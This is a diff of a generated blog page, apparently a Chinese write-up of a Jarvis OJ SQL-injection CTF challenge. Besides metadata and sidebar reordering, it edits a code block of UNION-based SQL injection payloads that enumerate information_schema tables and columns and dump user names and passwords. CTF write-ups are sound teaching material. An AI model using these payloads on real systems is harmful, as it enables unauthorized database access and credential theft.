@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">422</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">430</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -430,7 +430,7 @@ height:50vh;
 <p><strong>列名</strong></p>
 <p>columns =&gt; columns_name</p>
 </blockquote>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获得所有列名（字段），flag 要hex编码 0x666c6167</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=flag; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取表中的字段名</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获得所有列名（字段），若 " 被过滤，flag 可用hex编码 0x666c6167 代替</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"flag"</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取表中的字段名</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>
     </article>
     <!-- license  -->
     
@@ -438,7 +438,7 @@ height:50vh;
             <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
             </p><p>原文链接：<a href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/">https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</a>
             </p><p>发表日期：<a href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/">February 26th 2019, 5:56:10 pm</a>
-            </p><p>更新日期：<a href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/">March 17th 2019, 1:53:43 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/">March 22nd 2019, 9:39:44 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -832,6 +832,10 @@ top:50vh;
     
     
     
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 19
@@ -875,7 +879,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ-2352-Stars-树状数组</a>
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ-2352-Stars[树状数组]</a>
         </li>
     
     
@@ -919,12 +923,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ-3984-迷宫问题[BFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ-1321-棋盘问题[DFS]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ-1321-棋盘问题[DFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ-3984-迷宫问题[BFS]</a>
         </li>
     
     
@@ -961,13 +965,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
-        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
-    
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
     
         <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
     
